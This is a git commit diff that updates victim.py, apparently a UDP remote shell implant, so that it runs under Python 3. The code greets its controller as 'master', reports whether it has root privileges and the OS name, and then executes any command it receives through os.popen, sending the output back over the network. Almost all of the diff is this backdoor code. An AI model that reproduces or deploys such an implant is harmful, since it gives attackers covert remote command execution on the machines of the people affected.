dd466156481208e2c199a39fa7760b9c3052a2bb
BlackBird63030 <141164867+BlackBird63030@users.noreply.github.com>
2023-10-27 13:34:12 +0200

    Update victim.py

--- victim.py
+++ victim.py
@@ -11,7 +11,7 @@ def launch():
     launch = s.recvfrom(1024)
     addr = launch[1][0]
     port = launch[1][1]
-    s.sendto('hello master', (addr, port))
+    s.sendto(b'hello master', (addr, port))
     return s, addr, port
 
 s, addr, port = launch()
@@ -21,13 +21,13 @@ def getsysinfo():
     prompt = []
     if que[1][0] == addr and que[1][1] == port:
         if os.getuid() == 0:
-            prompt.append('root@')
-            prompt.append('# ')
+            prompt.append(b'root@')
+            prompt.append(b'# ')
         else:
-            prompt.append('user@')
-            prompt.append('$ ')
+            prompt.append(b'user@')
+            prompt.append(b'$ ')
         prompt.append(platform.dist()[0])
-        s.sendto(''.join(prompt), (addr, port))
+        s.sendto(b''.join(prompt), (addr, port))
         return
 
 getsysinfo()
@@ -36,22 +36,22 @@ def shell():
     while 1:
         try:
             command = s.recv(1024)
-            if command.strip().split()[0] == 'cd':
-                os.chdir(command.strip('cd '))
-                s.sendto('Changed Directory', (addr, port))
-            elif command.strip() == 'goodbye':
-                s.sendto('Goodbye master', (addr, port))
+            if command.strip().split()[0] == b'cd':
+                os.chdir(command.strip(b'cd '))
+                s.sendto(b'Changed Directory', (addr, port))
+            elif command.strip() == b'goodbye':
+                s.sendto(b'Goodbye master', (addr, port))
                 s.close()
                 break
             else:
-                proc = os.popen(command)
-                output = ''
+                proc = os.popen(command.decode())
+                output = b''
                 for i in proc.readlines():
-                    output += i
+                    output += i.encode()
                 output = output.strip()
                 s.sendto(output, (addr, port))
         except Exception:
-            s.sendto('An unexpected error has occurred', (addr, port))
+            s.sendto(b'An unexpected error has occurred', (addr, port))
             pass
 
 shell()
